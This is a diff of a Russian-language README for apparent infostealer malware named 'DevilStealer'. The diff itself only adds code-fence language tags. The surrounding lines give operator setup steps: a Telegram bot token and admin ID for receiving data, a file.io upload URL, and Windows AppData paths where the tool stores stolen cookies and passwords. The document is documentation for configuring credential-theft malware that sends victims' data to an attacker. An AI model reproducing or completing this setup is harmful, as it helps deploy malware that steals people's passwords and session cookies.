@@ -80,7 +80,7 @@ pip install pyTelegramBotAPI
 
 Измените bot = telebot.Telebot("СЮДА ТОКЕН ВАШЕГО БОТА") (Создать бота можно в @BotFather)
 
-```
+```python
 ADMIN_ID = "ID" # Your telegram id
 FILE_IO_API_URL = "https://file.io"
 
@@ -89,7 +89,7 @@ bot = telebot.TeleBot("TOKEN") # Your bot token
 
 **Если вы хотите другой путь на сохранение временных файлов стиллера то отредактируйте stealer.py**
 
-```
+```python
 FILE_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData"
 FILE_COOKIE = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\cookie"
 FILE_PASSWORDS = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\passwords"
@@ -124,7 +124,7 @@ pip3 install pyTelegramBotAPI
 
 Измените bot = telebot.Telebot("СЮДА ТОКЕН ВАШЕГО БОТА") (Создать бота можно в @BotFather)
 
-```
+```python
 ADMIN_ID = "ID" # Your telegram id
 FILE_IO_API_URL = "https://file.io"
 
@@ -133,7 +133,7 @@ bot = telebot.TeleBot("TOKEN") # Your bot token
 
 **Если вы хотите другой путь на сохранение временных файлов стиллера то отредактируйте stealer.py**
 
-```
+```python
 FILE_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData"
 FILE_COOKIE = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\cookie"
 FILE_PASSWORDS = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\passwords"
